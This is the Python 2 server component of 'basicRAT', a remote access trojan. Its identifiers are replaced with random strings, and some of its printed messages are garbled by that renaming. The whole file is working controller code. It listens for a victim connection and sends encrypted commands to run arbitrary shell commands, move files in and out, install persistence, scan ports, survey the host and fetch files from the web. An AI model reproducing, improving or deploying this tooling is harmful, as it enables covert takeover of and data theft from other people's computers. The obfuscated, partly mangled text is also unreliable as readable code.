#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" Basic RAT """
'''   test   '''
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import PCIXrYBHgUfcWimMNwcVTszRyHYsbXNo,OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ,HbXGxUiFGAGASkxUVivHmrjONjMwQoxq
    from core.filesock import ZtWixuDXDhaMQOEglQBRYVZQGcktUJMs, WFREbbdnIuOOJMStvqQujEfaBoFJDwWU
except ImportError as BFNKxxPCmlZXGlUoSHjrycpHKQwcazuB:
    print BFNKxxPCmlZXGlUoSHjrycpHKQwcazuB
    sys.exit(0)
LzuvFxpRilJurJwCTlHJFkFUOanOCubA = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
dmHcLXBIjJJjgvfTipfEBMweBJNRlNhr = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
WPSmJJPFwOMrUkAWtDctgzwJCOsAqlwP = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def OyxsnckhQUqeHayFbPaORDWXTtGlLFwf():
    ldawWNiqRqXgmitdcwXzzPCdfgeARgfP = argparse.ArgumentParser(description='basicRAT server')
    ldawWNiqRqXgmitdcwXzzPCdfgeARgfP.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return ldawWNiqRqXgmitdcwXzzPCdfgeARgfP
def rgcgUomIlWRhOPHtjLlQXjGPvmRZupqZ():
    ldawWNiqRqXgmitdcwXzzPCdfgeARgfP  = OyxsnckhQUqeHayFbPaORDWXTtGlLFwf()
    TGislMAdRMNgXLqEDAfsZcHJxoFZJtdw    = vars(ldawWNiqRqXgmitdcwXzzPCdfgeARgfP.parse_args())
    ONEWfBjVFuESyayyMVvpsXQfuaevhqEB    = TGislMAdRMNgXLqEDAfsZcHJxoFZJtdw['port']
    vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.bind(('0.0.0.0', ONEWfBjVFuESyayyMVvpsXQfuaevhqEB))
    except socket.error:
        print 'Error: Unable to start vwOMQwNsxCabHbgQnnUmZUakiMDcYkls, ONEWfBjVFuESyayyMVvpsXQfuaevhqEB {} in use?'.format(ONEWfBjVFuESyayyMVvpsXQfuaevhqEB)
        sys.exit(1)
    for wdGwjvGdnSgGxbfzaBvLeSGGOYwXdiIX in dmHcLXBIjJJjgvfTipfEBMweBJNRlNhr.split('\n'):
        time.sleep(0.05)
        print wdGwjvGdnSgGxbfzaBvLeSGGOYwXdiIX
    print 'basicRAT vwOMQwNsxCabHbgQnnUmZUakiMDcYkls listening on ONEWfBjVFuESyayyMVvpsXQfuaevhqEB {}...'.format(ONEWfBjVFuESyayyMVvpsXQfuaevhqEB)
    vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.listen(10)
    EmPmCwaPEePYvAXopPbCtydAyZnHVdPW, xydRDpETsphUvNNTgGpoQDlXXwcOIQvf = vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.accept()
    fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle = HbXGxUiFGAGASkxUVivHmrjONjMwQoxq(EmPmCwaPEePYvAXopPbCtydAyZnHVdPW, vwOMQwNsxCabHbgQnnUmZUakiMDcYkls=True)
    while True:
        KCyvdamexUQpaUGPkvglmqpGNfqHqcEx = raw_input('\n[{}] basicRAT> '.format(xydRDpETsphUvNNTgGpoQDlXXwcOIQvf[0])).rstrip()
        if not KCyvdamexUQpaUGPkvglmqpGNfqHqcEx:
            continue
        fSgGPfNZXyxlXbPZFUlNngKytImwGcJA, _, action = KCyvdamexUQpaUGPkvglmqpGNfqHqcEx.partition(' ')
        if fSgGPfNZXyxlXbPZFUlNngKytImwGcJA not in WPSmJJPFwOMrUkAWtDctgzwJCOsAqlwP:
            print 'Invalid command, type "help" to see vQMNHggnjDZvwWjgYiIPUPRAeZxWPfiP list of commands.'
            continue
        if fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'help':
            print LzuvFxpRilJurJwCTlHJFkFUOanOCubA
            continue
        EmPmCwaPEePYvAXopPbCtydAyZnHVdPW.send(OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ(KCyvdamexUQpaUGPkvglmqpGNfqHqcEx, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle))
        if fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'quit':
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.close()
            sys.exit(0)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'run':
            hcomeXuqrAgaoOcZZpBQHPISufwRLwbc = EmPmCwaPEePYvAXopPbCtydAyZnHVdPW.recv(4096)
            print PCIXrYBHgUfcWimMNwcVTszRyHYsbXNo(hcomeXuqrAgaoOcZZpBQHPISufwRLwbc, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle).rstrip()
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'download':
            for ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd in action.split():
                ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd = ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd.strip()
                ZtWixuDXDhaMQOEglQBRYVZQGcktUJMs(EmPmCwaPEePYvAXopPbCtydAyZnHVdPW, ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'upload':
            for ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd in action.split():
                ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd = ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd.strip()
                WFREbbdnIuOOJMStvqQujEfaBoFJDwWU(EmPmCwaPEePYvAXopPbCtydAyZnHVdPW, ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'rekey':
            fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle = HbXGxUiFGAGASkxUVivHmrjONjMwQoxq(EmPmCwaPEePYvAXopPbCtydAyZnHVdPW, vwOMQwNsxCabHbgQnnUmZUakiMDcYkls=True)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(fSgGPfNZXyxlXbPZFUlNngKytImwGcJA)
            hcomeXuqrAgaoOcZZpBQHPISufwRLwbc = EmPmCwaPEePYvAXopPbCtydAyZnHVdPW.recv(1024)
            print PCIXrYBHgUfcWimMNwcVTszRyHYsbXNo(hcomeXuqrAgaoOcZZpBQHPISufwRLwbc, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle)
if __name__ == '__main__':
    rgcgUomIlWRhOPHtjLlQXjGPvmRZupqZ()
